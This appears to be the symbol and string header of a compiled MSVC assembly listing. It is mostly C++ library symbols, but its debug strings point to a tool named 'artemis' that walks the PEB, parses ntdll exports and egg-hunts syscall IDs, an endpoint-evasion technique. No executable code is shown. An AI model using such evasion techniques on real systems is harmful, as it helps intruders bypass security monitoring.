PUBLIC	??$?0AEAPEAV_Facet_base@std@@@?$_Compressed_pair@U?$default_delete@V_Facet_base@std@@@std@@PEAV_Facet_base@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@AEAPEAV_Facet_base@1@@Z ; std::_Compressed_pair<std::default_delete<std::_Facet_base>,std::_Facet_base *,1>::_Compressed_pair<std::default_delete<std::_Facet_base>,std::_Facet_base *,1><std::_Facet_base * &>
PUBLIC	??$forward@AEBV?$allocator@_W@std@@@std@@YAAEBV?$allocator@_W@0@AEBV10@@Z ; std::forward<std::allocator<wchar_t> const &>
PUBLIC	??$_Construct_in_place@_WAEB_W@std@@YAXAEA_WAEB_W@Z ; std::_Construct_in_place<wchar_t,wchar_t const &>
PUBLIC	??$construct@_WAEB_W@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SAXAEAV?$allocator@_W@1@QEA_WAEB_W@Z ; std::_Default_allocator_traits<std::allocator<wchar_t> >::construct<wchar_t,wchar_t const &>
PUBLIC	??$_Uninitialized_move@PEA_WV?$allocator@_W@std@@@std@@YAPEA_WQEA_W0PEA_WAEAV?$allocator@_W@0@@Z ; std::_Uninitialized_move<wchar_t *,std::allocator<wchar_t> >
PUBLIC	??$_Construct_in_place@EAEBE@std@@YAXAEAEAEBE@Z	; std::_Construct_in_place<unsigned char,unsigned char const &>
PUBLIC	??$_Unfancy@E@std@@YAPEAEPEAE@Z			; std::_Unfancy<unsigned char>
PUBLIC	??$construct@EAEBE@?$_Default_allocator_traits@V?$allocator@E@std@@@std@@SAXAEAV?$allocator@E@1@QEAEAEBE@Z ; std::_Default_allocator_traits<std::allocator<unsigned char> >::construct<unsigned char,unsigned char const &>
PUBLIC	??$_Uninitialized_move@PEAEV?$allocator@E@std@@@std@@YAPEAEQEAE0PEAEAEAV?$allocator@E@0@@Z ; std::_Uninitialized_move<unsigned char *,std::allocator<unsigned char> >
PUBLIC	??$_Construct_in_place@DAEBD@std@@YAXAEADAEBD@Z	; std::_Construct_in_place<char,char const &>
PUBLIC	??$construct@DAEBD@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SAXAEAV?$allocator@D@1@QEADAEBD@Z ; std::_Default_allocator_traits<std::allocator<char> >::construct<char,char const &>
PUBLIC	??$_Uninitialized_move@PEADV?$allocator@D@std@@@std@@YAPEADQEAD0PEADAEAV?$allocator@D@0@@Z ; std::_Uninitialized_move<char *,std::allocator<char> >
PUBLIC	??$forward@AEBQEA_W@std@@YAAEBQEA_WAEBQEA_W@Z	; std::forward<wchar_t * const &>
PUBLIC	??$forward@AEBQEAD@std@@YAAEBQEADAEBQEAD@Z	; std::forward<char * const &>
PUBLIC	??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z ; std::_Allocate_manually_vector_aligned<std::_Default_allocate_traits>
PUBLIC	??$forward@AEAPEAV_Facet_base@std@@@std@@YAAEAPEAV_Facet_base@0@AEAPEAV10@@Z ; std::forward<std::_Facet_base * &>
PUBLIC	??$addressof@_W@std@@YAPEA_WAEA_W@Z		; std::addressof<wchar_t>
PUBLIC	??$_Voidify_iter@PEA_W@std@@YAPEAXPEA_W@Z	; std::_Voidify_iter<wchar_t *>
PUBLIC	??$_Get_unwrapped@AEBQEA_W@std@@YA?A_TAEBQEA_W@Z ; std::_Get_unwrapped<wchar_t * const &>
PUBLIC	??$move@AEA_W@std@@YA$$QEA_WAEA_W@Z		; std::move<wchar_t &>
PUBLIC	??$_Copy_memmove@PEA_WPEA_W@std@@YAPEA_WPEA_W00@Z ; std::_Copy_memmove<wchar_t *,wchar_t *>
PUBLIC	??0?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAA@PEA_WAEAV?$allocator@_W@1@@Z ; std::_Uninitialized_backout_al<std::allocator<wchar_t> >::_Uninitialized_backout_al<std::allocator<wchar_t> >
PUBLIC	??1?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAA@XZ ; std::_Uninitialized_backout_al<std::allocator<wchar_t> >::~_Uninitialized_backout_al<std::allocator<wchar_t> >
PUBLIC	?_Release@?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAAPEA_WXZ ; std::_Uninitialized_backout_al<std::allocator<wchar_t> >::_Release
PUBLIC	??$_Emplace_back@_W@?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAAX$$QEA_W@Z ; std::_Uninitialized_backout_al<std::allocator<wchar_t> >::_Emplace_back<wchar_t>
PUBLIC	??$addressof@E@std@@YAPEAEAEAE@Z		; std::addressof<unsigned char>
PUBLIC	??$_Voidify_iter@PEAE@std@@YAPEAXPEAE@Z		; std::_Voidify_iter<unsigned char *>
PUBLIC	??$_Get_unwrapped@AEBQEAE@std@@YA?A_TAEBQEAE@Z	; std::_Get_unwrapped<unsigned char * const &>
PUBLIC	??$move@AEAE@std@@YA$$QEAEAEAE@Z		; std::move<unsigned char &>
PUBLIC	??$_Copy_memmove@PEAEPEAE@std@@YAPEAEPEAE00@Z	; std::_Copy_memmove<unsigned char *,unsigned char *>
PUBLIC	??0?$_Uninitialized_backout_al@V?$allocator@E@std@@@std@@QEAA@PEAEAEAV?$allocator@E@1@@Z ; std::_Uninitialized_backout_al<std::allocator<unsigned char> >::_Uninitialized_backout_al<std::allocator<unsigned char> >
PUBLIC	??1?$_Uninitialized_backout_al@V?$allocator@E@std@@@std@@QEAA@XZ ; std::_Uninitialized_backout_al<std::allocator<unsigned char> >::~_Uninitialized_backout_al<std::allocator<unsigned char> >
PUBLIC	?_Release@?$_Uninitialized_backout_al@V?$allocator@E@std@@@std@@QEAAPEAEXZ ; std::_Uninitialized_backout_al<std::allocator<unsigned char> >::_Release
PUBLIC	??$_Emplace_back@E@?$_Uninitialized_backout_al@V?$allocator@E@std@@@std@@QEAAX$$QEAE@Z ; std::_Uninitialized_backout_al<std::allocator<unsigned char> >::_Emplace_back<unsigned char>
PUBLIC	??$addressof@D@std@@YAPEADAEAD@Z		; std::addressof<char>
PUBLIC	??$_Voidify_iter@PEAD@std@@YAPEAXPEAD@Z		; std::_Voidify_iter<char *>
PUBLIC	??$_Get_unwrapped@AEBQEAD@std@@YA?A_TAEBQEAD@Z	; std::_Get_unwrapped<char * const &>
PUBLIC	??$move@AEAD@std@@YA$$QEADAEAD@Z		; std::move<char &>
PUBLIC	??$_Copy_memmove@PEADPEAD@std@@YAPEADPEAD00@Z	; std::_Copy_memmove<char *,char *>
PUBLIC	??0?$_Uninitialized_backout_al@V?$allocator@D@std@@@std@@QEAA@PEADAEAV?$allocator@D@1@@Z ; std::_Uninitialized_backout_al<std::allocator<char> >::_Uninitialized_backout_al<std::allocator<char> >
PUBLIC	??1?$_Uninitialized_backout_al@V?$allocator@D@std@@@std@@QEAA@XZ ; std::_Uninitialized_backout_al<std::allocator<char> >::~_Uninitialized_backout_al<std::allocator<char> >
PUBLIC	?_Release@?$_Uninitialized_backout_al@V?$allocator@D@std@@@std@@QEAAPEADXZ ; std::_Uninitialized_backout_al<std::allocator<char> >::_Release
PUBLIC	??$_Emplace_back@D@?$_Uninitialized_backout_al@V?$allocator@D@std@@@std@@QEAAX$$QEAD@Z ; std::_Uninitialized_backout_al<std::allocator<char> >::_Emplace_back<char>
PUBLIC	??$_To_address@PEA_W@std@@YA?A_PAEBQEA_W@Z	; std::_To_address<wchar_t *>
PUBLIC	??$forward@_W@std@@YA$$QEA_WAEA_W@Z		; std::forward<wchar_t>
PUBLIC	??$construct@_W_W@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SAXAEAV?$allocator@_W@1@QEA_W$$QEA_W@Z ; std::_Default_allocator_traits<std::allocator<wchar_t> >::construct<wchar_t,wchar_t>
PUBLIC	??$_To_address@PEAE@std@@YA?A_PAEBQEAE@Z	; std::_To_address<unsigned char *>
PUBLIC	??$forward@E@std@@YA$$QEAEAEAE@Z		; std::forward<unsigned char>
PUBLIC	??$construct@EE@?$_Default_allocator_traits@V?$allocator@E@std@@@std@@SAXAEAV?$allocator@E@1@QEAE$$QEAE@Z ; std::_Default_allocator_traits<std::allocator<unsigned char> >::construct<unsigned char,unsigned char>
PUBLIC	??$_To_address@PEAD@std@@YA?A_PAEBQEAD@Z	; std::_To_address<char *>
PUBLIC	??$forward@D@std@@YA$$QEADAEAD@Z		; std::forward<char>
PUBLIC	??$construct@DD@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SAXAEAV?$allocator@D@1@QEAD$$QEAD@Z ; std::_Default_allocator_traits<std::allocator<char> >::construct<char,char>
PUBLIC	?_OptionsStorage@?1??__local_stdio_printf_options@@9@4_KA ; `__local_stdio_printf_options'::`2'::_OptionsStorage
PUBLIC	??_7exception@std@@6B@				; std::exception::`vftable'
PUBLIC	??_C@_0BC@EOODALEL@Unknown?5exception@		; `string'
PUBLIC	??_7bad_alloc@std@@6B@				; std::bad_alloc::`vftable'
PUBLIC	??_7bad_array_new_length@std@@6B@		; std::bad_array_new_length::`vftable'
PUBLIC	??_C@_0BF@KINCDENJ@bad?5array?5new?5length@	; `string'
PUBLIC	_TI3?AVbad_array_new_length@std@@
PUBLIC	_CTA3?AVbad_array_new_length@std@@
PUBLIC	??_R0?AVbad_array_new_length@std@@@8		; std::bad_array_new_length `RTTI Type Descriptor'
PUBLIC	_CT??_R0?AVbad_array_new_length@std@@@8??0bad_array_new_length@std@@QEAA@AEBV01@@Z24
PUBLIC	??_R0?AVbad_alloc@std@@@8			; std::bad_alloc `RTTI Type Descriptor'
PUBLIC	_CT??_R0?AVbad_alloc@std@@@8??0bad_alloc@std@@QEAA@AEBV01@@Z24
PUBLIC	??_R0?AVexception@std@@@8			; std::exception `RTTI Type Descriptor'
PUBLIC	_CT??_R0?AVexception@std@@@8??0exception@std@@QEAA@AEBV01@@Z24
PUBLIC	??_C@_0BA@JFNIOLAK@string?5too?5long@		; `string'
PUBLIC	??_7runtime_error@std@@6B@			; std::runtime_error::`vftable'
PUBLIC	??_R0?AVruntime_error@std@@@8			; std::runtime_error `RTTI Type Descriptor'
PUBLIC	_CT??_R0?AVruntime_error@std@@@8??0runtime_error@std@@QEAA@AEBV01@@Z24
PUBLIC	??_7_System_error@std@@6B@			; std::_System_error::`vftable'
PUBLIC	??_C@_02LMMGGCAJ@?3?5@				; `string'
PUBLIC	??_7system_error@std@@6B@			; std::system_error::`vftable'
PUBLIC	??_C@_00CNPNBAHC@@				; `string'
PUBLIC	??_R0?AVsystem_error@std@@@8			; std::system_error `RTTI Type Descriptor'
PUBLIC	_CT??_R0?AVsystem_error@std@@@8??0system_error@std@@QEAA@AEBV01@@Z40
PUBLIC	??_R0?AV_System_error@std@@@8			; std::_System_error `RTTI Type Descriptor'
PUBLIC	_CT??_R0?AV_System_error@std@@@8??0_System_error@std@@QEAA@AEBV01@@Z40
PUBLIC	??_7_Iostream_error_category2@std@@6B@		; std::_Iostream_error_category2::`vftable'
PUBLIC	??_C@_08LLGCOLLL@iostream@			; `string'
PUBLIC	?_Iostream_error@?4??message@_Iostream_error_category2@std@@UEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@3@H@Z@4QBDB ; `std::_Iostream_error_category2::message'::`5'::_Iostream_error
PUBLIC	??_7bad_cast@std@@6B@				; std::bad_cast::`vftable'
PUBLIC	??_C@_08EPJLHIJG@bad?5cast@			; `string'
PUBLIC	_TI2?AVbad_cast@std@@
PUBLIC	_CTA2?AVbad_cast@std@@
PUBLIC	??_R0?AVbad_cast@std@@@8			; std::bad_cast `RTTI Type Descriptor'
PUBLIC	_CT??_R0?AVbad_cast@std@@@8??0bad_cast@std@@QEAA@AEBV01@@Z24
PUBLIC	??_7_Facet_base@std@@6B@			; std::_Facet_base::`vftable'
PUBLIC	??_C@_0BA@ELKIONDK@bad?5locale?5name@		; `string'
PUBLIC	??_C@_05LAPONLG@false@				; `string'
PUBLIC	??_C@_04LOAJBDKD@true@				; `string'
PUBLIC	??_7facet@locale@std@@6B@			; std::locale::facet::`vftable'
PUBLIC	??_7ctype_base@std@@6B@				; std::ctype_base::`vftable'
PUBLIC	??_7?$ctype@D@std@@6B@				; std::ctype<char>::`vftable'
PUBLIC	??_7?$ctype@_W@std@@6B@				; std::ctype<wchar_t>::`vftable'
PUBLIC	??_7failure@ios_base@std@@6B@			; std::ios_base::failure::`vftable'
PUBLIC	??_C@_0BF@PHHKMMFD@ios_base?3?3badbit?5set@	; `string'
PUBLIC	??_C@_0BG@FMKFHCIL@ios_base?3?3failbit?5set@	; `string'
PUBLIC	??_C@_0BF@OOHOMBOF@ios_base?3?3eofbit?5set@	; `string'
PUBLIC	_TI5?AVfailure@ios_base@std@@
PUBLIC	_CTA5?AVfailure@ios_base@std@@
PUBLIC	??_R0?AVfailure@ios_base@std@@@8		; std::ios_base::failure `RTTI Type Descriptor'
PUBLIC	_CT??_R0?AVfailure@ios_base@std@@@8??0failure@ios_base@std@@QEAA@AEBV012@@Z40
PUBLIC	??_C@_0BP@MKMLILOE@?6Not?5Found?4?5Continuing?5Loop?4?4?4@ ; `string'
PUBLIC	??_C@_0BC@JNHAIKLA@?6Found?5NTDLL?4DLL?$CB@	; `string'
PUBLIC	??_C@_08NHEHJBFE@?6PEB?3?5?$CFp@		; `string'
PUBLIC	??_C@_0BC@LONENMFL@?6PEB?5LDR?5Addr?3?5?$CFp@	; `string'
PUBLIC	??_C@_0BH@FJNJOCCD@?6LDR?5InMemLoadList?3?5?$CFp@ ; `string'
PUBLIC	??_C@_01EEMJAFIK@?6@				; `string'
PUBLIC	??_C@_0BH@OBFLALEB@?6NTDLL?5Module?5Base?3?5?$CFp@ ; `string'
PUBLIC	??_C@_0BA@LCKOAPAP@?6Image?5Base?3?5?$CFp@	; `string'
PUBLIC	??_C@_0CE@LGEJMOEH@?6Export?5Functions?5Directory?5Ptr@ ; `string'
PUBLIC	??_C@_0CA@MBJLGEGM@?6Export?5Names?5Directory?5Ptr?3?5?$CFp@ ; `string'
PUBLIC	??_C@_0BF@PMMHMJLI@?6Function?5Found?$CB?3?5?$CFs@ ; `string'
PUBLIC	??_C@_0BH@MOIEDGH@?6Function?5Addr?5Ptr?3?5?$CFp@ ; `string'
PUBLIC	??_C@_0BM@FINOJFAM@?6Function?5Addr?5Ptr?5Data?3?5?$CFp@ ; `string'
PUBLIC	??_C@_08OMFPBCCL@?6Egg?3?5?$CFp@		; `string'
PUBLIC	??_C@_0M@ODKJDBAK@?6Window?3?5?$CFp@		; `string'
PUBLIC	??_C@_0CC@GDLBNECE@?6Found?5Egg?$CB?5Grabbing?5Syscall?5Id@ ; `string'
PUBLIC	??_C@_0BE@PGDPLDOM@?6?$FL?$CL?$FN?5Syscall?5Id?3?5?$CFx@ ; `string'
PUBLIC	??_C@_0O@JKHBPFAG@?6Assembly?3?5?$CFp@		; `string'
PUBLIC	??_C@_1BE@GJOFHIHD@?$AAn?$AAt?$AAd?$AAl?$AAl?$AA?4?$AAd?$AAl?$AAl@ ; `string'
PUBLIC	?artemis@@3VArtemis@@A				; artemis
PUBLIC	?syscallID@@3HA					; syscallID
PUBLIC	?id@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@2V0locale@2@A ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::id
PUBLIC	??_7?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@6B@ ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::`vftable'
PUBLIC	??_C@_02BBAHNLBA@?$CFp@				; `string'
PUBLIC	??_C@_02CLHGNPPK@Lu@				; `string'
PUBLIC	??_C@_02HIKPPMOK@Ld@				; `string'
PUBLIC	??_C@_02BDDLJJBK@lu@				; `string'
PUBLIC	??_C@_02EAOCLKAK@ld@				; `string'
PUBLIC	?id@?$numpunct@D@std@@2V0locale@2@A		; std::numpunct<char>::id
PUBLIC	??_7?$numpunct@D@std@@6B@			; std::numpunct<char>::`vftable'
PUBLIC	??_C@_02MDKMJEGG@eE@				; `string'
PUBLIC	??_C@_02OOPEBDOJ@pP@				; `string'
PUBLIC	??_C@_01LFCBOECM@?4@				; `string'
PUBLIC	??_C@_0BI@CFPLBAOH@invalid?5string?5position@	; `string'
PUBLIC	?_Static@?1???$_Immortalize_memcpy_image@V_Iostream_error_category2@std@@@std@@YAAEBV_Iostream_error_category2@1@XZ@4U?$_Constexpr_immortalize_impl@V_Iostream_error_category2@std@@@1@A ; `std::_Immortalize_memcpy_image<std::_Iostream_error_category2>'::`2'::_Static
PUBLIC	?_Psave@?$_Facetptr@V?$ctype@D@std@@@std@@2PEBVfacet@locale@2@EB ; std::_Facetptr<std::ctype<char> >::_Psave
PUBLIC	?_Psave@?$_Facetptr@V?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@std@@2PEBVfacet@locale@2@EB ; std::_Facetptr<std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > > >::_Psave
PUBLIC	?_Psave@?$_Facetptr@V?$numpunct@D@std@@@std@@2PEBVfacet@locale@2@EB ; std::_Facetptr<std::numpunct<char> >::_Psave
PUBLIC	?_Psave@?$_Facetptr@V?$ctype@_W@std@@@std@@2PEBVfacet@locale@2@EB ; std::_Facetptr<std::ctype<wchar_t> >::_Psave
PUBLIC	??_C@_0BA@FOIKENOD@vector?5too?5long@		; `string'
PUBLIC	??_R4exception@std@@6B@				; std::exception::`RTTI Complete Object Locator'
PUBLIC	??_R3exception@std@@8				; std::exception::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2exception@std@@8				; std::exception::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@exception@std@@8			; std::exception::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4bad_alloc@std@@6B@				; std::bad_alloc::`RTTI Complete Object Locator'
PUBLIC	??_R3bad_alloc@std@@8				; std::bad_alloc::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2bad_alloc@std@@8				; std::bad_alloc::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@bad_alloc@std@@8			; std::bad_alloc::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4bad_array_new_length@std@@6B@		; std::bad_array_new_length::`RTTI Complete Object Locator'
PUBLIC	??_R3bad_array_new_length@std@@8		; std::bad_array_new_length::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2bad_array_new_length@std@@8		; std::bad_array_new_length::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@bad_array_new_length@std@@8	; std::bad_array_new_length::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4runtime_error@std@@6B@			; std::runtime_error::`RTTI Complete Object Locator'
PUBLIC	??_R3runtime_error@std@@8			; std::runtime_error::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2runtime_error@std@@8			; std::runtime_error::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@runtime_error@std@@8		; std::runtime_error::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R0?AVerror_category@std@@@8			; std::error_category `RTTI Type Descriptor'
PUBLIC	??_R3error_category@std@@8			; std::error_category::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2error_category@std@@8			; std::error_category::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@error_category@std@@8		; std::error_category::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4_System_error@std@@6B@			; std::_System_error::`RTTI Complete Object Locator'
PUBLIC	??_R3_System_error@std@@8			; std::_System_error::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2_System_error@std@@8			; std::_System_error::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@_System_error@std@@8		; std::_System_error::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4system_error@std@@6B@			; std::system_error::`RTTI Complete Object Locator'
PUBLIC	??_R3system_error@std@@8			; std::system_error::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2system_error@std@@8			; std::system_error::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@system_error@std@@8		; std::system_error::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4_Iostream_error_category2@std@@6B@		; std::_Iostream_error_category2::`RTTI Complete Object Locator'
PUBLIC	??_R0?AV_Iostream_error_category2@std@@@8	; std::_Iostream_error_category2 `RTTI Type Descriptor'
PUBLIC	??_R3_Iostream_error_category2@std@@8		; std::_Iostream_error_category2::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2_Iostream_error_category2@std@@8		; std::_Iostream_error_category2::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@_Iostream_error_category2@std@@8	; std::_Iostream_error_category2::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4bad_cast@std@@6B@				; std::bad_cast::`RTTI Complete Object Locator'
PUBLIC	??_R3bad_cast@std@@8				; std::bad_cast::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2bad_cast@std@@8				; std::bad_cast::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@bad_cast@std@@8			; std::bad_cast::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4_Facet_base@std@@6B@			; std::_Facet_base::`RTTI Complete Object Locator'
PUBLIC	??_R0?AV_Facet_base@std@@@8			; std::_Facet_base `RTTI Type Descriptor'
PUBLIC	??_R3_Facet_base@std@@8				; std::_Facet_base::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2_Facet_base@std@@8				; std::_Facet_base::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@_Facet_base@std@@8		; std::_Facet_base::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R1A@?0A@EA@facet@locale@std@@8		; std::locale::facet::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R0?AVfacet@locale@std@@@8			; std::locale::facet `RTTI Type Descriptor'
PUBLIC	??_R3facet@locale@std@@8			; std::locale::facet::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2facet@locale@std@@8			; std::locale::facet::`RTTI Base Class Array'
PUBLIC	??_R17?0A@EA@_Crt_new_delete@std@@8		; std::_Crt_new_delete::`RTTI Base Class Descriptor at (8,-1,0,64)'
PUBLIC	??_R0?AU_Crt_new_delete@std@@@8			; std::_Crt_new_delete `RTTI Type Descriptor'
PUBLIC	??_R3_Crt_new_delete@std@@8			; std::_Crt_new_delete::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2_Crt_new_delete@std@@8			; std::_Crt_new_delete::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@_Crt_new_delete@std@@8		; std::_Crt_new_delete::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4facet@locale@std@@6B@			; std::locale::facet::`RTTI Complete Object Locator'
PUBLIC	??_R4ctype_base@std@@6B@			; std::ctype_base::`RTTI Complete Object Locator'
PUBLIC	??_R0?AUctype_base@std@@@8			; std::ctype_base `RTTI Type Descriptor'
PUBLIC	??_R3ctype_base@std@@8				; std::ctype_base::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2ctype_base@std@@8				; std::ctype_base::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@ctype_base@std@@8			; std::ctype_base::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4?$ctype@D@std@@6B@				; std::ctype<char>::`RTTI Complete Object Locator'
PUBLIC	??_R0?AV?$ctype@D@std@@@8			; std::ctype<char> `RTTI Type Descriptor'
PUBLIC	??_R3?$ctype@D@std@@8				; std::ctype<char>::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2?$ctype@D@std@@8				; std::ctype<char>::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@?$ctype@D@std@@8			; std::ctype<char>::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4?$ctype@_W@std@@6B@			; std::ctype<wchar_t>::`RTTI Complete Object Locator'
PUBLIC	??_R0?AV?$ctype@_W@std@@@8			; std::ctype<wchar_t> `RTTI Type Descriptor'
PUBLIC	??_R3?$ctype@_W@std@@8				; std::ctype<wchar_t>::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2?$ctype@_W@std@@8				; std::ctype<wchar_t>::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@?$ctype@_W@std@@8			; std::ctype<wchar_t>::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4failure@ios_base@std@@6B@			; std::ios_base::failure::`RTTI Complete Object Locator'
PUBLIC	??_R3failure@ios_base@std@@8			; std::ios_base::failure::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2failure@ios_base@std@@8			; std::ios_base::failure::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@failure@ios_base@std@@8		; std::ios_base::failure::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@6B@ ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::`RTTI Complete Object Locator'
PUBLIC	??_R0?AV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@8 ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > > `RTTI Type Descriptor'
PUBLIC	??_R3?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@8 ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@8 ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@8 ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4?$numpunct@D@std@@6B@			; std::numpunct<char>::`RTTI Complete Object Locator'
PUBLIC	??_R0?AV?$numpunct@D@std@@@8			; std::numpunct<char> `RTTI Type Descriptor'
PUBLIC	??_R3?$numpunct@D@std@@8			; std::numpunct<char>::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2?$numpunct@D@std@@8			; std::numpunct<char>::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@?$numpunct@D@std@@8		; std::numpunct<char>::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	__real@4202a05f20000000
EXTRN	_purecall:PROC
EXTRN	??2@YAPEAX_K@Z:PROC				; operator new
EXTRN	??3@YAXPEAX_K@Z:PROC				; operator delete
EXTRN	??_V@YAXPEAX@Z:PROC				; operator delete[]
EXTRN	atexit:PROC
EXTRN	_invalid_parameter_noinfo_noreturn:PROC
EXTRN	??0_Lockit@std@@QEAA@H@Z:PROC			; std::_Lockit::_Lockit
EXTRN	??1_Lockit@std@@QEAA@XZ:PROC			; std::_Lockit::~_Lockit
EXTRN	abs:PROC
EXTRN	fabs:PROC
EXTRN	frexp:PROC
EXTRN	calloc:PROC
EXTRN	free:PROC
EXTRN	_byteswap_ulong:PROC
EXTRN	__acrt_iob_func:PROC
EXTRN	__stdio_common_vfprintf:PROC
EXTRN	__stdio_common_vsprintf_s:PROC
EXTRN	memchr:PROC
EXTRN	memcmp:PROC
EXTRN	memcpy:PROC
EXTRN	memmove:PROC
EXTRN	memset:PROC
EXTRN	wcslen:PROC
EXTRN	strcspn:PROC
EXTRN	strlen:PROC
EXTRN	?_Xbad_alloc@std@@YAXXZ:PROC			; std::_Xbad_alloc
EXTRN	?_Xlength_error@std@@YAXPEBD@Z:PROC		; std::_Xlength_error
EXTRN	?_Xout_of_range@std@@YAXPEBD@Z:PROC		; std::_Xout_of_range
EXTRN	?_Xruntime_error@std@@YAXPEBD@Z:PROC		; std::_Xruntime_error
EXTRN	?uncaught_exception@std@@YA_NXZ:PROC		; std::uncaught_exception
EXTRN	__std_exception_copy:PROC
EXTRN	__std_exception_destroy:PROC
EXTRN	??_Eexception@std@@UEAAPEAXI@Z:PROC		; std::exception::`vector deleting destructor'
EXTRN	??_Ebad_alloc@std@@UEAAPEAXI@Z:PROC		; std::bad_alloc::`vector deleting destructor'
EXTRN	??_Ebad_array_new_length@std@@UEAAPEAXI@Z:PROC	; std::bad_array_new_length::`vector deleting destructor'
EXTRN	??_Eruntime_error@std@@UEAAPEAXI@Z:PROC		; std::runtime_error::`vector deleting destructor'
EXTRN	??_E_System_error@std@@UEAAPEAXI@Z:PROC		; std::_System_error::`vector deleting destructor'
EXTRN	??_Esystem_error@std@@UEAAPEAXI@Z:PROC		; std::system_error::`vector deleting destructor'
EXTRN	?_Syserror_map@std@@YAPEBDH@Z:PROC		; std::_Syserror_map
EXTRN	??_E_Iostream_error_category2@std@@UEAAPEAXI@Z:PROC ; std::_Iostream_error_category2::`vector deleting destructor'
EXTRN	??_Ebad_cast@std@@UEAAPEAXI@Z:PROC		; std::bad_cast::`vector deleting destructor'
EXTRN	??_E_Facet_base@std@@UEAAPEAXI@Z:PROC		; std::_Facet_base::`vector deleting destructor'
EXTRN	?_Facet_Register@std@@YAXPEAV_Facet_base@1@@Z:PROC ; std::_Facet_Register
EXTRN	localeconv:PROC
EXTRN	_Getctype:PROC
EXTRN	_Getcvt:PROC
EXTRN	_Mbrtowc:PROC
EXTRN	_Tolower:PROC
EXTRN	_Toupper:PROC
EXTRN	_Wcrtomb:PROC
EXTRN	_Getwctype:PROC
